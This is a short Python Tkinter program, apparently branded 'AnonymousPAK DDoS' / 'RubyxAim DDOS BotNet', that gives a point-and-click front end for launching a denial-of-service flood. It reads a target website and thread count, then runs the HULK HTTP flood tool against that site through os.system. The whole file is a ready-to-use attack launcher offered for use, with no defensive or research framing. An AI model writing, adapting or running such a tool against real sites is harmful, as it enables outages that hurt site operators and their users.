from tkinter import *
import tkinter as tk
import os
from tkinter import messagebox
import subprocess
import shlex
import platform
#DDoSing Target Function
def run_command(command):
    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            print(output.strip())
    rc = process.poll()
    return rc
def Attack_Target():
    website = str(Website.get())
    threads = str(Thread.get())
    if str(platform.system()) == 'Linux':
        os.system('figlet AnonymousPAK DDoS')
    else:
        os.system("pyfiglet AnonymousPAK DDoS")
    messagebox.showinfo("Attack Status", "RubyxAim started to atack " + str(threads) + " on Website " + website)
    if str(platform.system()) == 'Windows':
        os.system('go run hulk.go -site {0}'.format(website))
    else:
        DDoS_Output = "HULKMAXPROCS={0} go run hulk.go -site {1}".format(threads, website)
        os.system(DDoS_Output)



       
    
root = tk.Tk()
root.title("AnonymousPAK-DDoS Tool GUI")

Information = Label(text = "RubyxAim DDOS BotNet)", font = 'Calbri')
Information.grid(row =1, column =1)
Usage = Label(text = 'Udescargada de: rubyxaim.webcindario)')
Usage.grid(row =2, column =1)
Website_Name = Label(text = "Obejtivo")
Website_Name.grid(row = 3, column =1)
Website = tk.Entry(root,bd = 5)
Website.grid(row =4, column =1)
Thread_Name = Label(text = "Threads")
Thread_Name.grid(row = 5, column =1)
Thread = tk.Entry(root,bd = 5)
Thread.grid(row = 6, column =1)

Attack_Button = Button(text = 'Attack Target', font = 'Calbri', bd = 5, command = Attack_Target)
Attack_Button.grid(row = 7, column =1)
root.mainloop()
